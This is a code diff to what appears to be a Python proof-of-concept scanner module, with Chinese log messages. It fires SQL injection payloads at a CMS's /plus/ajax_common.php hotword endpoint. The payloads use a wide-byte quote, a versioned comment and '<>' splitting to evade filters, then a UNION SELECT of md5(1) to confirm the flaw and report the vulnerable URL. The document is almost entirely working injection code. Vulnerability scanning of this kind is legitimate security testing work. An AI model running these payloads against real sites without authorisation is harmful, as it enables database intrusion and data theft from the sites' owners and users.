@@ -47,16 +47,17 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            arg = '{target}'.format(target=self.target)
-            url1 = arg + '/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5(1),3%23'
-            url2 = arg + \
-                '/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,md5(1),3%23'
+            url1 = self.target + '/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5(1),3%23'
+            url2 = self.target + '/plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,md5(1),3%23'
+
             code1, head1, res1, errcode1, finalurl1 = hh.http(url1)
+            if code1 == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res1:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\nSQL注入漏洞地址为{url}'.format(
+                        target=self.target, name=self.vuln.name,url=url1))
             code2, head2, res2, errcode2, finalurl2 = hh.http(url2)
-            if code1 == 200 or code2 == 200:
-                if "c4ca4238a0b923820dcc509a6f75849b" in res1 or "c4ca4238a0b923820dcc509a6f75849b" in res2:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+            if code2 == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res2:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\nSQL注入漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name,url=url2))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
